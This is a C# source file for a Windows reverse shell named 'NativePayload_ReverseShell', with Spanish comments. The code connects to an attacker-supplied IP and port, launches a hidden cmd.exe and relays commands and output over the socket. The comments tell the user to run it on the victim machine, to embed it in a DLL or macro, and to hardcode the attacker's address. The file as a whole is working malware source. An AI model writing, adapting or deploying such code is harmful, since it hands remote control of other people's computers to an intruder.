using System;
using System.Linq;
using System.Collections.Generic;
using System.Text;
using System.Diagnostics;
using System.Threading;
using System.Threading.Tasks;
using System.Net.Sockets;
using System.IO;


//Ejecutar en máquina victima. Lo suyo es utilizar este código para ya sea inyectarlo en un DLL, macro o algo así. Esto tal cual en .cs es "irreal" en un caso real
//


namespace NativePayload_ReverseShell
{
    class Program
    {
        public static StringBuilder _Liger = new StringBuilder(); //System.Text
        private static StreamWriter _LionTiger; //System.IO
        static void Main(string[] args)
        {
	        Console.WriteLine();
            Console.ForegroundColor = ConsoleColor.DarkGray;
            Console.WriteLine("NativePayload_ReverseShell");
            Console.ForegroundColor = ConsoleColor.Gray;
            Console.WriteLine("Native_ReverseShell , C# Managed Shell Code");
            Console.WriteLine();

            try
            {
                using (TcpClient Simple = new TcpClient(args[0].ToString(), Convert.ToInt32(args[1]))) //IP/Port del atacante por linea comandos, meterlas directamente mejor
                {
                    Thread.Sleep(1100);
                    using (Stream Very = Simple.GetStream()) //System.IO
                    {
                        using (StreamReader OoPS = new StreamReader(Very))
                        {
                            _LionTiger = new StreamWriter(Very);
                            Process _Tiger = new Process();
                            Thread.Sleep(3300);
                            _Tiger.StartInfo.FileName = "cmd.exe";
                            _Tiger.StartInfo.CreateNoWindow = true;
                            _Tiger.StartInfo.UseShellExecute = false;
                            _Tiger.OutputDataReceived += _OutputDataReceived;
                            _Tiger.StartInfo.RedirectStandardOutput = true;
                            _Tiger.StartInfo.RedirectStandardInput = true;
                            _Tiger.StartInfo.RedirectStandardError = true;
                            _Tiger.Start();
                            _Tiger.BeginOutputReadLine();
                            while (true)
                            {
                                Thread.Sleep(3000);
                                _Liger.Append(OoPS.ReadLine());
                                _Tiger.StandardInput.WriteLine(_Liger);
                                _Liger.Remove(0, _Liger.Length);
                            }
                        }
                    }

                }
            }
            catch (Exception) {  }
        }

        private static void _OutputDataReceived(object sender, DataReceivedEventArgs echo)
        {
            StringBuilder strOutput = new StringBuilder();

            if (!String.IsNullOrEmpty(echo.Data))
            {
                try
                {
                    strOutput.Append(echo.Data);
                    _LionTiger.WriteLine(strOutput);
                    _LionTiger.Flush();
                }
                catch (Exception err) { }
            }
        }
    }
}
